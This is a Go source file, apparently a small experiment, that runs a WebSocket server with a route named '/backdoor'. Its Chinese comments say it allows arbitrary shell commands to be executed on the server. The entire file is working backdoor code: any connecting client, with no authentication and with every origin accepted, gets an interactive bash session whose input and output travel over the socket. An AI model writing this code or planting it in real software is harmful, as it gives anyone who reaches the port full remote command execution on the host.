/*
 * 可通过 postman 访问 ws://localhost:8080 实现在服务端执行任意 shell 命令
 */
package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/backdoor", backdoor)
	http.ListenAndServe(":8080", r)
}

func backdoor(rw http.ResponseWriter, r *http.Request) {
	upgrader := websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	conn, err := upgrader.Upgrade(rw, r, nil)
	if err != nil {
		log.Println("serve ws " + err.Error())
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/bash", "-i")

	rp, wp := io.Pipe()
	fmt.Println("-------- again ")
	go func() {
		for {
			_, msg, err := conn.ReadMessage()
			fmt.Println("got cmd:", string(msg))
			if err != nil {
				log.Println(" -----go cmd err " + err.Error())
				return
			}
			if string(bytes.TrimSpace(msg)) == "" {
				continue
			}
			msg = append(msg, '\n')
			if _, err = wp.Write(msg); err != nil {
				log.Println("---- wp write err: " + err.Error())
			}
			fmt.Println("--- write done")
		}
	}()

	cmd.Stdin = rp
	cmd.Stdout = &Writer{conn}
	cmd.Stderr = &Writer{conn}
	if err = cmd.Run(); err != nil {
		log.Println("--- cmd err: " + err.Error())
	}
	fmt.Println("------- done")
}

type Writer struct {
	Conn *websocket.Conn
}

func (w *Writer) Write(p []byte) (n int, err error) {
	log.Println("-----------" + string(p))

	cw, err := w.Conn.NextWriter(websocket.TextMessage) // 如果用 w.Conn.WriteMessage 会写完后就关闭 writer，最后造成 broken pipe
	if err != nil {                                     // 用 NextWriter 就不会了。还是要看 RFC 并且源码才算专业吧
		log.Println("---" + err.Error())
		return
	}
	return cw.Write(p)
}
